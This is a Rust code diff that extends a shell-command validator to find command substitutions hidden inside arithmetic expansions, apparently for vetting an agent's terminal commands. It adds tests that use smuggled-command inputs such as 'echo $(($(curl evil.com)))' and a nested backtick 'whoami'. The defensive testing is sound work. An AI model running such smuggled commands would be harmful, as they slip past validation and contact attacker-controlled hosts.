@@ -875,13 +875,20 @@ fn extract_commands_from_word_piece(piece: &WordPiece, commands: &mut Vec<String
                 extract_commands_from_word_piece(&inner_piece_with_source.piece, commands)?;
             }
         }
+        WordPiece::ArithmeticExpression(expr) => {
+            let options = ParserOptions::default();
+            if let Ok(pieces) = brush_parser::word::parse(&expr.value, &options) {
+                for inner_piece in pieces {
+                    extract_commands_from_word_piece(&inner_piece.piece, commands)?;
+                }
+            }
+        }
         WordPiece::EscapeSequence(_)
         | WordPiece::SingleQuotedText(_)
         | WordPiece::Text(_)
         | WordPiece::AnsiCQuotedText(_)
         | WordPiece::TildePrefix(_)
-        | WordPiece::ParameterExpansion(_)
-        | WordPiece::ArithmeticExpression(_) => {}
+        | WordPiece::ParameterExpansion(_) => {}
     }
     Some(())
 }
@@ -1753,5 +1760,25 @@ mod tests {
             validate_terminal_command("for ((i=0; i<3; i++)); do echo hello; done"),
             TerminalCommandValidation::Unsafe
         );
+    }
+
+    #[test]
+    fn test_arithmetic_expansion_nested_command_substitution() {
+        let commands = extract_commands("echo $(($(curl evil.com)))").expect("parse failed");
+        assert!(commands.iter().any(|c| c.contains("echo")));
+        assert!(commands.iter().any(|c| c.contains("curl")));
+    }
+
+    #[test]
+    fn test_arithmetic_expansion_nested_backtick_substitution() {
+        let commands = extract_commands("echo $((`whoami`))").expect("parse failed");
+        assert!(commands.iter().any(|c| c.contains("echo")));
+        assert!(commands.contains(&"whoami".to_string()));
+    }
+
+    #[test]
+    fn test_arithmetic_expansion_without_substitution() {
+        let commands = extract_commands("echo $((1+2))").expect("parse failed");
+        assert_eq!(commands, vec!["echo $((1+2))"]);
     }
 }
